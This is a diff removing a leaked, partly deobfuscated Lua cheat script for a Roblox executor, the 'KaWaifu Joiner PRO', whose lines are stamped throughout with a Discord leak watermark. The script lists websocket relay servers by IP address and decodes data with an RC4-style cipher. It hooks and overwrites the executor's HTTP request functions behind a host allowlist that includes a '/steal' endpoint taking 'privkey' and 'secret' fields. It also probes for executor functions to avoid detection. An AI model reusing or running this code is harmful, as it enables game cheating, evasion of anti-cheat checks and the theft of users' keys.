-								n = { [56] = 8, [48] = 0, [100] = 13, [52] = 4, [51] = 3, [66] = 11, [67] = 12 }
-								slicedn34 = 55  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn35 = 49
-								slicedn37 = 1
-							end
-
-							continue
-						end
-
-						if slicedn34 <= 23 then
-							if slicedn34 <= 19 then
-								if slicedn34 <= 17 then
-									if slicedn34 <= 16 then
-										char2 = string.char  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										byte = string.byte
-
-										if slicedn33 == 2 then
-											slicedn34 = 26
-											slicedn35 = n
-										else
-											slicedn34 = 0
-										end
-									else
-										slicedn34 = 11
-										n = 0  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										slicedn33 = 0
-										char2 = ""
-										tbl32 = { 0, nil, 1, tbl32, #v + 0 }
-									end
-								elseif slicedn34 <= 18 then
-									slicedn35 = (slicedn35 - slicedn38) / 2
-									slicedn36 = (slicedn36 - slicedn40) / 2
-									slicedn38 = slicedn35 % 2
-									slicedn40 = slicedn36 % 2
-
-									if slicedn38 ~= slicedn40 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										slicedn34 = 54
-										slicedn37 = 128
-									else
-										slicedn34 = 7
-									end
-								else
-									sliced91[sliced92] = char2
-									slicedn34 = 34
-								end
-							elseif slicedn34 <= 21 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								if slicedn34 <= 20 then
-									tbl32 = tbl32[4]
-									slicedn34 = 17
-								else
-									slicedn34 = 1
-									str12 = ""
-									tbl32 = { 1, 0, nil, 64, tbl32 }
-								end
-							elseif slicedn34 <= 22 then
-								slicedn35 = (slicedn35 - slicedn38) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn36 = (slicedn36 - slicedn40) / 2
-								slicedn38 = slicedn35 % 2
-								slicedn40 = slicedn36 % 2
-
-								if slicedn38 ~= slicedn40 then
-									slicedn34 = 32
-									slicedn37 = 32
-								else
-									slicedn34 = 58
-								end
-							else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								str12 += 65536
-								slicedn34 = 51
-							end
-
-							continue
-						end
-
-						if slicedn34 <= 27 then
-							if slicedn34 <= 25 then
-								if slicedn34 <= 24 then
-									local sliced93 = tbl32[1]
-									local sliced94 = tbl32[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local slicedn42 = tbl32[5] + sliced93
-									local flag21 = sliced93 <= 0
-									local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-									tbl32[5] = slicedn42
-
-									if flag22 then
-										slicedn34 = 21
-										slicedn41 = slicedn42
-									else
-										slicedn34 = 62
-									end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								else
-									local sliced93 = tbl32[3]
-									local sliced94 = tbl32[5]
-									local slicedn42 = tbl32[1] + sliced93
-									local flag21 = sliced93 <= 0
-									local flag22 = not flag21
-									local flag23 = slicedn42 >= sliced94
-									local flag24 = slicedn42 <= sliced94
-									flag23 = flag21 and flag23
-									flag23 = flag23 or flag22 and flag24  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									tbl32[1] = slicedn42
-
-									if flag23 then
-										slicedn34 = 50
-										str12 = slicedn42
-									else
-										slicedn34 = 60
-									end
-								end
-							elseif slicedn34 <= 26 then
-								n = slicedn35[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn33 = 4 * (slicedn35[1] % 64) + 1
-								slicedn36 = 2 * (slicedn35[2] % 128) - 1
-								slicedn34 = 52
-								tbl32 = { 1, -1, nil, 255, tbl32 }
-							else
-								local sliced93 = tbl32[4]
-								local sliced94 = tbl32[3]
-								local slicedn42 = tbl32[2] + sliced93
-								local flag21 = sliced93 <= 0
-								local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								tbl32[2] = slicedn42
-
-								if flag22 then
-									slicedn34 = 63
-									slicedn35 = slicedn42
-								else
-									slicedn34 = 53
-								end
-							end
-
-							continue
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						if slicedn34 <= 29 then
-							if slicedn34 <= 28 then
-								n = (n + 1) % 256
-								slicedn33 = (slicedn33 + tbl31[n]) % 256
-								local sliced93 = tbl31[n]
-								tbl31[n] = tbl31[slicedn33]
-								tbl31[slicedn33] = sliced93
-								local sliced94 = byte(v, slicedn35)
-								slicedn36 = tbl31[(tbl31[n] + tbl31[slicedn33]) % 256]
-								slicedn37 = sliced94 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn38 = slicedn36 % 2
-
-								if slicedn37 ~= slicedn38 then
-									slicedn34 = 44
-									slicedn35 = sliced94
-								else
-									slicedn34 = 38
-									slicedn39 = 0
-									slicedn35 = sliced94
-								end
-
-								continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							end
-
-							return nil
-						end
-
-						if slicedn34 <= 30 then
-							slicedn39 += slicedn37
-							slicedn34 = 39
-						else
-							slicedn36 = { byte(n, 1, 64) }
-							slicedn34 = 24
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					else
-						if slicedn34 <= 47 then
-							if slicedn34 <= 39 then
-								if slicedn34 <= 35 then
-									if slicedn34 <= 33 then
-										if slicedn34 <= 32 then
-											slicedn39 += slicedn37
-											slicedn34 = 58
-										else
-											slicedn35 = (slicedn35 - slicedn38) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-											slicedn36 = (slicedn36 - slicedn40) / 2
-											slicedn38 = slicedn35 % 2
-											slicedn40 = slicedn36 % 2
-
-											if slicedn38 ~= slicedn40 then
-												slicedn34 = 30
-												slicedn37 = 8
-											else
-												slicedn34 = 39
-											end
-										end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-										continue
-									end
-
-									if slicedn34 <= 34 then
-										return
-									end
-									tbl32 = tbl32[4]
-									slicedn34 = 19
-									continue
-								end
-
-								if slicedn34 <= 37 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									if slicedn34 <= 36 then
-										slicedn34 = not slicedn38 and 61 or 9
-									else
-										tbl32 = tbl32[5]
-										slicedn34 = 59
-									end
-								elseif slicedn34 <= 38 then
-									slicedn35 = (slicedn35 - slicedn37) / 2
-									slicedn36 = (slicedn36 - slicedn38) / 2
-									slicedn38 = slicedn35 % 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn40 = slicedn36 % 2
-
-									if slicedn38 ~= slicedn40 then
-										slicedn34 = 49
-										slicedn37 = 2
-									else
-										slicedn34 = 14
-									end
-								else
-									slicedn35 = (slicedn35 - slicedn38) / 2
-									slicedn36 = (slicedn36 - slicedn40) / 2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn38 = slicedn35 % 2
-									slicedn40 = slicedn36 % 2
-
-									if slicedn38 ~= slicedn40 then
-										slicedn34 = 48
-										slicedn37 = 16
-									else
-										slicedn34 = 22
-									end
-								end
-
-								continue  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							end
-
-							if slicedn34 <= 43 then
-								if slicedn34 <= 41 then
-									if slicedn34 <= 40 then
-										str12 -= 65536
-										slicedn34 = 47
-									else
-										n[slicedn35] = slicedn37
-										n[69] = 14
-										n[55] = 7  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										n[53] = 5
-										n[57] = 9
-										n[99] = 12
-										n[54] = 6
-										slicedn34 = 27
-										tbl32 = { tbl32, -1, 31, 1, nil }
-									end
-								elseif slicedn34 <= 42 then
-									slicedn36 = {}
-
-									slicedn39 = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										"a",
-										"6",
-										"b",
-										"3",
-										"5",
-										"e",
-										"2",
-										"0",
-										"d",
-										"1",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										"7",
-										"f",
-										"4",
-										"8",
-										"c",
-										"9",
-									}
-
-									slicedn34 = 24
-									slicedn35 = 3846715392
-									slicedn37 = -2141334987  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn38 = -1976388651
-									slicedn40 = 1
-									tbl32 = { 1, tbl32, 128, nil, 0 }
-								else
-									slicedn39 += slicedn37
-									slicedn34 = 33
-								end
-							elseif slicedn34 <= 45 then
-								if slicedn34 <= 44 then
-									slicedn34 = 38  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn39 = 1
-								else
-									slicedn34 = 10
-									tbl32 = { tbl32, 1, 32, nil, 0 }
-								end
-							elseif slicedn34 <= 46 then
-								tbl30[n] = char2(n)
-								tbl31[n] = n
-								n = (slicedn33 * n + slicedn36) % 256
-								slicedn34 = 52  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							else
-								n = (n - str12) / 65536
-								local slicedn42 = (slicedn33 + str12) % slicedn37
-								local slicedn43 = slicedn42 % slicedn38
-								slicedn33 = ((((slicedn42 - slicedn43) / slicedn38 * slicedn40 + slicedn43 * slicedn41) % slicedn38 * slicedn38 + slicedn43 * slicedn40) % slicedn37 + slicedn36) % slicedn37
-								slicedn34 = 25
-							end
-
-							continue
-						end
-
-						if slicedn34 <= 55 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-							if slicedn34 <= 51 then
-								if slicedn34 <= 49 then
-									if slicedn34 <= 48 then
-										slicedn39 += slicedn37
-										slicedn34 = 22
-									else
-										slicedn39 += slicedn37
-										slicedn34 = 14
-									end
-								elseif slicedn34 <= 50 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									str12 = n % 65536
-									slicedn34 = str12 < 0 and 23 or 51
-								else
-									slicedn34 = str12 >= 65536 and 40 or 47
-								end
-							elseif slicedn34 <= 53 then
-								if slicedn34 <= 52 then
-									local sliced93 = tbl32[1]
-									local sliced94 = tbl32[4]
-									local slicedn42 = tbl32[2] + sliced93  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local flag21 = sliced93 <= 0
-									local flag22 = not flag21
-									local flag23 = slicedn42 >= sliced94
-									local flag24 = slicedn42 <= sliced94
-									flag23 = flag21 and flag23
-									flag23 = flag23 or flag22 and flag24
-									tbl32[2] = slicedn42
-
-									if flag23 then
-										slicedn34 = 46
-										slicedn37 = slicedn42  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									else
-										slicedn34 = 37
-									end
-								else
-									tbl32 = tbl32[1]
-									slicedn34 = 26
-									slicedn35 = slicedn33
-								end
-							elseif slicedn34 <= 54 then
-								slicedn39 += slicedn37  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 7
-							else
-								n[slicedn35] = slicedn37
-								n[50] = 2
-								n[102] = 15
-								n[98] = 11
-								n[68] = 13
-								n[101] = 14
-								n[70] = 15
-								n[65] = 10  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 41
-								slicedn35 = 97
-								slicedn37 = 10
-							end
-
-							continue
-						end
-
-						if slicedn34 <= 59 then
-							if slicedn34 <= 57 then
-								if slicedn34 <= 56 then
-									local sliced93 = tbl32[3]  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									local sliced94 = tbl32[1]
-									local slicedn42 = tbl32[5] + sliced93
-									local flag21 = sliced93 <= 0
-									local flag22 = flag21 and slicedn42 >= sliced94 or not flag21 and slicedn42 <= sliced94
-									tbl32[5] = slicedn42
-
-									if flag22 then
-										slicedn34 = 12
-										slicedn33 = slicedn42
-									else
-										slicedn34 = 20  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									end
-								else
-									slicedn34 = slicedn33 == 0 and 3 or 26
-								end
-							elseif slicedn34 <= 58 then
-								slicedn35 = (slicedn35 - slicedn38) / 2
-								slicedn36 = (slicedn36 - slicedn40) / 2
-								slicedn38 = slicedn35 % 2
-								slicedn40 = slicedn36 % 2
-
-								if slicedn38 ~= slicedn40 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-									slicedn34 = 13
-									slicedn37 = 64
-								else
-									slicedn34 = 18
-								end
-							else
-								slicedn34 = 56
-								n = 0
-								tbl32 = { 255, nil, 1, tbl32, -1 }
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-							continue
-						end
-
-						if slicedn34 <= 61 then
-							if slicedn34 <= 60 then
-								tbl32 = tbl32[4]
-								slicedn34 = 45
-								continue
-							end
-
-							break
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-						if slicedn34 <= 62 then
-							tbl32 = tbl32[2]
-							slicedn34 = 15
-						else
-							local slicedn42 = slicedn35 * 2 + 1
-							local sliced93 = slicedn36[slicedn42]
-							local sliced94 = slicedn36[slicedn42 + 1]
-
-							if not sliced93 then
-								slicedn34 = 29
-							else  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-								slicedn34 = 36
-								slicedn37 = sliced93
-								slicedn38 = sliced94
-							end
-						end
-					end
-				end
-
-				return nil
-			end
-
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	end
-
-	getgenv().JoinerConfig_jhgjerdf324sa = {}
-
-	tbl26 = {
-		default = "de",
-		scheme = "ws",
-		fail_threshold = 5,
-		path = "/joiner_fsh34gc1vz5nmj12/ws",
-		regions = {
-			{
-				id = "de",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				label = "Germany (Frankfurt)",
-				host = "35.246.155.30",
-				port = 16527,
-			},
-			{
-				id = "us-east",
-				label = "USA-East (Virginia)",
-				host = "5.161.58.47",
-				port = 16527,
-			},  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			{
-				id = "us-west",
-				label = "USA-West (Oregon)",
-				host = "5.78.117.191",
-				port = 16527,
-			},
-			{
-				id = "ca",
-				label = "Canada (Toronto)",
-				host = "34.130.18.95",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				port = 16527,
-			},
-			{
-				id = "br",
-				label = "Brazil (São Paulo)",
-				host = "34.95.179.70",
-				port = 16527,
-			},
-			{
-				id = "mid-east",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				label = "Middle East (Tel Aviv)",
-				host = "34.165.127.121",
-				port = 16527,
-			},
-			{
-				id = "sg",
-				label = "Singapore",
-				host = "34.126.91.44",
-				port = 16527,
-			},  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			{
-				id = "uk",
-				label = "United Kingdom",
-				host = "35.189.75.127",
-				port = 16527,
-			},
-			{
-				id = "mx",
-				label = "Mexico",
-				host = "34.51.22.120",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				port = 16527,
-			},
-			{
-				id = "at",
-				label = "Austria (Vienna)",
-				host = "86.106.183.225",
-				port = 16527,
-			},
-			{
-				id = "es",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				label = "Spain (Madrid)",
-				host = "34.175.12.84",
-				port = 16527,
-			},
-		},
-	}
-
-	getgenv().AJVersion = "3.4.3"
-
-	tbl17 = {
-		SplitView = false,
-		FeedMaxRows = 40,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		ExpandRowHeight = 40,
-		ExpandRowGap = 4,
-		ExpandBarHeight = 24,
-		WindowSize = Vector2.new(600, 450),
-		MinWindowSize = Vector2.new(420, 315),
-		TopBarHeight = 46,
-		SidebarWidth = 112,
-		ProfilesPanelWidth = 190,
-		ProfilesPanelGap = 8,
-		WsTabX = 16,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		WsTabOutY = -28,
-		WsTabHiddenY = 8,
-		LatProbeSweepSecs = 20,
-		LatProbeTimeout = 4,
-		LatBetterStreak = 60,
-		LatPopupCooldown = 900,
-		LatServerStale = 300,
-		LatServerDead = 1800,
-		LatCacheMaxAge = 86400,
-		LatSwitchMarginMs = 25,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		LatSwitchMarginPct = 0.2,
-		LatEarlyWindow = 90,
-		LatProbeOnTouch = false,
-		DefaultAutoJoin = false,
-		DefaultAttempts = 50,
-		DefaultMaxServerAge = 10,
-		DefaultMaxDuelTime = 10,
-		DefaultShowDuels = true,
-		DefaultCarpetMode = "Yes",
-		DefaultAutoJoinOGOffAJ = false,  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		AnyNewestMinDwell = 0,
-		DefaultMidRetrySwitch = "Better Newest",
-		DefaultBruteForce = true,
-		DefaultMinimizeOnInject = false,
-		DefaultSoundId = "5348162330",
-		DefaultSoundVolume = 10,
-		DefaultAnimSpeed = 5,
-		DefaultHotkeyMinimize = "Z",
-		DefaultHotkeyAutoTP = "X",
-		RarityColors = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			Default = "#d91eea",
-			Secret = "#14f2f2",
-			OG = "#FFDD00",
-			Taco = "#FFDD00",
-			Spooky = "#FFDD00",
-			Festive = "#FFDD00",
-		},
-		DiscordInvite = "discord.gg/kawaifu-notifier",
-	}
-
-	splitView = tbl17.SplitView  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	slicedfn47 = function(w,B,I)return w.."_"..(I or 0).."_"..(B.DisplayName or"Nil").."_"..(B.Generation or 0);end
-
-	tbl28 = {
-		"luarmor.net",
-		"kawaifu.live",
-		"imgur.com",
-		"api.roauth.co",
-		"bkshub.xyz",
-		"github.com",
-		"githubusercontent.com",
-		"127.0.0.1",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	}
-
-	tbl29 = { "luarmor.net", "kawaifu.live", "imgur.com" }
-
-	up_1 = {
-		["http://72.60.1.175/verify"] = {
-			Methods = { "POST" },
-			Fields = {
-				"account_age",
-				"job_id",
-				"secret",
-				"username",  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				"place_id",
-				"key",
-				"hwid",
-				"user_id",
-				"executor",
-			},
-		},
-		["http://72.60.1.175/heartbeat"] = {
-			Methods = { "POST" },
-			Fields = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				"account_age",
-				"ts",
-				"key",
-				"hwid",
-				"user_id",
-			},
-		},
-		["https://haze-hub.onrender.com/refreshLock"] = {
-			Methods = { "POST" },
-			Fields = {  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				"loaderToken",
-				"sessionToken",
-				"bootSig",
-				"loaderSecret",
-				"hwid",
-			},
-		},
-		["https://haze-hub.onrender.com/validate"] = {
-			Methods = { "POST" },
-			Fields = { "hwid", "key", "clientNonce" },  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		},
-		["https://haze-hub.onrender.com/script"] = {
-			Methods = { "POST" },
-			Fields = {
-				"hwid",
-				"sessionToken",
-				"token",
-				"clientNonce",
-			},
-		},  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		["https://fmlybot2-production.up.railway.app/fmly/check"] = {
-			Methods = { "POST" },
-			Fields = { "roblox", "key", "jobId" },
-		},
-		["http://167.172.254.223:3005/steal"] = {
-			Methods = { "POST" },
-			Fields = { "value", "stealer", "privkey", "secret" },
-		},
-	}
-
-	slicedfn48 = function(B,I,e)local H=up_1[B];if not H then return false;end;if H.Methods and#H.Methods>0 then B=false;for w,w in ipairs(H.Methods)do if string.upper(w)==I then B=true;break;end;end;if not B then return false;end;end;if H.Fields and#H.Fields>0 then if not e or e==""then return true;end;local w=game:GetService("HttpService");B,I=pcall(function()return w:JSONDecode(e);end);if not B or type(I)~="table"then return false;end;local w={};for B,B in ipairs(H.Fields)do w[B]=true;end;for B,e in pairs(I)do if not w[B]then return false;end;end;end;return true;end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-	do
-		local v = request or http_request
-		local request_2
-
-		if v then
-			request_2 = v
-		else
-			request_2 = http and http.request
-		end
-
-		request_2 = request_2 or syn and syn.request
-
-		if request_2 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			request_ = request_2
-		else
-			request_ = fluxus and fluxus.request
-		end
-	end
-end
-
-do
-	local connect2 = WebSocket and WebSocket.connect or Websocket and Websocket.connect or websocket and websocket.connect
-
-	if connect2 then
-		connect = connect2  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-	else
-		connect = syn and syn.websocket and syn.websocket.connect
-	end
-end
-
-do
-	if request_ then
-		local v = newcclosure(function(arg)
-			if true then
-				local str12 = "Unknown"
-				local str13 = "GET"  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local flag21 = false
-				local flag22 = false
-
-				if type(arg) == "table" then
-					if arg.Url then
-						str12 = tostring(arg.Url)
-					end
-
-					if arg.Method then
-						if true then
-							str13 = string.upper(tostring(arg.Method))
-						end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					end
-
-					local match, v = str12:match("^(%w+)://([^/]+)")
-
-					if v then
-						if true then
-							local match2 = v:match("([^:]+)") or v
-							local sliced91 = string.lower(match2)
-
-							local function slicedfn49(arg2)
-								for _, sliced92 in ipairs(arg2) do
-									if sliced92 and sliced92 ~= "" then
-										local sliced93 = string.lower(sliced92)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-										if sliced91 == sliced93 then
-											return true
-										end
-										local n = #sliced93
-										if not (n < #sliced91) then
-											continue
-										end
-										local str14 = string.sub(sliced91, -n)
-										local str15 = string.sub(sliced91, -(n + 1), -(n + 1))
-										if str14 == sliced93 and str15 == "." then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-											return true
-										end
-									end
-								end
-
-								return false
-							end
-
-							flag21 = slicedfn49(tbl28)
-							flag22 = slicedfn49(tbl29)
-						end
-					end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-					if not flag21 then
-						flag21 = slicedfn48(str12, str13, arg.Body)
-
-					end
-				end
-
-				if flag21 then
-					if not flag22 then
-						warn("[KaWaifu Protector] ✅ALLOWED [" .. str13 .. "] to: " .. str12)
-
-					end
-
-					return request_(arg)
-				end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if not flag22 then
-					warn("[KaWaifu Protector] ❌BLOCKED [" .. str13 .. "] to: " .. str12)
-				end
-
-				return { Body = "{}", StatusCode = 403, StatusMessage = "Forbidden", Success = false, Headers = {} }
-			end
-
-		end)
-
-		local function slicedfn49(arg, arg2, arg3)
-			local sliced91 = isreadonly(arg)
-
-			if sliced91 then
-				setreadonly(arg, false)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
-			arg[arg2] = arg3
-
-			if sliced91 then
-				setreadonly(arg, true)
-			end
-		end
-
-		local sliced91 = "http_request"
-		slicedfn49(getgenv(), sliced91, v)
-
-		if getgenv().http then
-			slicedfn49(getgenv().http, "request", v)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		if syn then
-			syn.request = v
-		end
-
-		if fluxus then
-			fluxus.request = v
-		end
-	end
-
-	tbl18 = {}
-	tbl19 = {}  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-	slicedfn29 = function()
-		if not game:IsLoaded() then
-			game.Loaded:Wait()
-		end
-
-		task.wait()
-		getgenv()._KaWaifuSessionId = tick()
-		local kaWaifuSessionId = getgenv()._KaWaifuSessionId
-
-		if getgenv()._KaWaifuWS then
-			pcall(function()
-				getgenv()._KaWaifuWS:Close()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end)
-
-			getgenv()._KaWaifuWS = nil
-		end
-
-		local kaWaifuJoinerPRO = nil
-
-		pcall(function()
-			if gethui then
-				kaWaifuJoinerPRO = gethui():FindFirstChild("KaWaifuJoinerPRO")
-
-			end
-		end)
-
-		if not kaWaifuJoinerPRO then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			pcall(function()
-				kaWaifuJoinerPRO = game:GetService("CoreGui"):FindFirstChild("KaWaifuJoinerPRO")
-			end)
-		end
-
-		if kaWaifuJoinerPRO then
-			kaWaifuJoinerPRO:Destroy()
-		end
-
-		local HttpService = game:GetService("HttpService")
-		local TeleportService = game:GetService("TeleportService")
-		local Players2 = game:GetService("Players")  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local ReplicatedStorage = game:GetService("ReplicatedStorage")
-		local SoundService = game:GetService("SoundService")
-		local GuiService = game:GetService("GuiService")
-		local sliced91 = ReplicatedStorage:WaitForChild("Datas", 10)
-		local controllers = ReplicatedStorage:WaitForChild("Controllers", 10)
-		local packages = ReplicatedStorage:WaitForChild("Packages", 10)
-		local sliced92 = packages and packages:WaitForChild("Net", 10)
-		local localPlayer2 = Players2.LocalPlayer
-		local placeId = game.PlaceId
-		local tbl30 = {}  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local slicedn33 = 10
-		local flag21 = false
-		local str12 = "Yes"
-		local flag22 = false
-		local flag23 = false
-		local str13 = "Better Newest"
-		local slicedn34 = 10
-		local defaultAttempts = tbl17.DefaultAttempts or 50
-		local sliced93 = nil
-		local sliced94 = nil  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local sliced95 = false
-		local slicedn35 = 0
-		local sliced96 = false
-		local tbl31 = {}
-		local slicedn36 = 0
-		local slicedn37 = 0
-		local slicedn38 = 0
-		local flag24 = false
-		local sliced97 = nil
-		local tbl32 = { Global = { Enabled = false, MinGen = 0 }, Items = {} }  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local tbl33 = {}
-		local tbl34 = {}
-
-		local tbl35 = {
-			SoundId = tbl17.DefaultSoundId,
-			SoundVolume = tbl17.DefaultSoundVolume,
-			BruteForceJoin = tbl17.DefaultBruteForce,
-		}
-
-		local tbl36 = {}
-		local str14 = "Default"
-		local pack = table.pack  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		local unpack = table.unpack
-		local sliced98 = pcall
-		local setfenv = setfenv
-		local create = coroutine.create
-		local resume = coroutine.resume
-		local status = coroutine.status
-		local RunService = game:GetService("RunService")
-		local sliced100 = nil
-
-		local sliced101, sliced102 = sliced98(function()
-			return getrenv()  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end)
-
-		if sliced101 and type(sliced102) == "table" then
-			if true then
-				sliced100 = sliced102
-			end
-		end
-
-		local function slicedfn49()
-
-			for i = 1, 10 do
-				local ok, result = pcall(getfenv, i)
-				if not (ok and type(result) == "table") then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					break
-				end
-
-				local ok2, result2 = pcall(function()
-					return result.cloneref or result.getrenv or result.getgenv or result.hookfunction or result.isexecutorclosure or result.getconnections or result.getcustomasset
-				end)
-
-				if ok2 and result2 ~= nil then
-					return false
-				end
-			end
-
-			return true  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-		end
-
-		if sliced100 then
-			sliced98(setfenv, slicedfn49, sliced100)
-		end
-
-		local function slicedfn50(arg, ...)
-			local v = pack(...)
-			local sliced103 = nil
-			local flag25 = false
-
-			local function slicedfn51()
-				if sliced100 then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					local sliced104, sliced105 = sliced98(setfenv, 0, sliced100)
-
-					if not sliced104 then
-						sliced103 = pack(false, "gameCall: setfenv(0) rejected: " .. tostring(sliced105))
-						flag25 = true
-						return
-					end
-				end
-
-				local sliced104 = create(arg)
-				sliced103 = pack(resume(sliced104, unpack(v, 1, v.n)))
-
-				if status(sliced104) ~= "dead" then  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-					sliced103 = pack(false, "gameCall: target yielded, result unavailable")
-				end
-
-				flag25 = true
-			end
-
-			if sliced100 then
-				sliced98(setfenv, slicedfn51, sliced100)
-			end
-
-			task.spawn(slicedfn51)
-
-			if not flag25 then
-				local sliced104 = 15  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-				local n = os.clock() + sliced104
-
-				while not flag25 and os.clock() < n do
-					task.wait()
-				end
-
-				if not flag25 then
-					return false, "gameCall: no return within 15s"
-				end
-			end
-
-			return unpack(sliced103, 1, sliced103.n)
-		end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-		local tbl37 = { ready = false, disabled = false, inside = false, verified = nil }
-
-		local function slicedfn51()
-			if not (getconnections and islclosure and isexecutorclosure) then
-				return nil
-			end
-			local tbl38 = {}
-
-			for _, v in { "Heartbeat", "RenderStepped", "PostSimulation" }, nil, nil do
-				local sliced103, sliced104 = sliced98(function()
-					return RunService[v]
-				end)  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-				if sliced103 and sliced104 then
-					tbl38[#tbl38 + 1] = sliced104
-				end
-			end
-
-			for _, v in tbl38, nil, nil do
-				local sliced103, sliced104 = sliced98(getconnections, v)
-
-				if sliced103 and type(sliced104) == "table" then
-					for _, sliced105 in sliced104, nil, nil do
-						local flag25, sliced106 = sliced98(function()
-							return sliced105.Function  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end)
-
-						if flag25 then
-							local sliced107 = "function"
-							flag25 = type(sliced106) == sliced107
-						end
-
-						if flag25 and islclosure(sliced106) and not isexecutorclosure(sliced106) then
-							local sliced107, sliced108 = sliced98(debug.info, sliced106, "s")
-							if sliced107 and type(sliced108) == "string" and sliced108:find("^ReplicatedStorage%.") and not sliced108:find("ReplicatedFirst") then
-								return sliced106, sliced105, sliced108
-							end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-						end
-					end
-				end
-			end
-
-			return nil
-		end
-
-		local function slicedfn52()
-			if tbl37.ready then
-				return true
-			end  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-
-			if tbl37.disabled then
-				return false
-			end
-
-			if not (loadstring and hookfunction) then
-				tbl37.disabled = true
-				return false
-			end
-			local v, sliced103, sliced104 = slicedfn51()
-			if not v then
-				return false  -- LEAKED BY #1 SOURCES /printed | discord.gg/printed
-			end
-
